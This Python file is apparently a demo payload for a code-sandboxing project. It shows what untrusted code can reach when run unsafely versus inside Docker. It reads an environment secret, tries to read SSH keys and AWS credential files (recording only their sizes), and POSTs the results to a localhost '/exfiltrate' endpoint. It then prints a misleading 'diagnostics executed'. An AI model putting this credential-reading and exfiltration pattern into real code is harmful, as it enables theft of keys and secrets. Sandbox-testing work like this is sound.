"""Deliberately "malicious" demo payload.

This is NOT real malware. It's a short script that attempts common exfil steps:
  - read env vars
  - read local files
  - call out to the network

Run it with:
  DEMO_SECRET=super-secret python local/unsafe_exec.py examples/malicious.py
  DEMO_SECRET=super-secret python local/sandbox_docker.py examples/malicious.py
"""

import json
import os
import pathlib
import urllib.request

payload = {
    "env": {
        "DEMO_SECRET": os.environ.get("DEMO_SECRET"),
    },
    "files": [],
    "network": {},
}

targets = [
    pathlib.Path("~/.ssh/id_rsa").expanduser(),
    pathlib.Path("~/.ssh/config").expanduser(),
    pathlib.Path("~/.aws/credentials").expanduser(),
]
for p in targets:
    entry = {"path": str(p)}
    try:
        data = p.read_text(encoding="utf-8", errors="ignore")
        # Just send the bytes length
        entry["bytes"] = len(data)
    except Exception as e:
        entry["error"] = str(e)
    payload["files"].append(entry)

try:
    with urllib.request.urlopen("https://example.com", timeout=3) as r:
        payload["network"] = {"ok": True, "status": r.status}
except Exception as e:
    payload["network"] = {"ok": False, "error": str(e)}

body = json.dumps(payload).encode("utf-8")
req = urllib.request.Request(
    "http://localhost:8000/exfiltrate",
    data=body,
    headers={"Content-Type": "application/json"},
    method="POST",
)
try:
    with urllib.request.urlopen(req, timeout=3):
        pass
except Exception:
    pass

print("diagnostics executed")
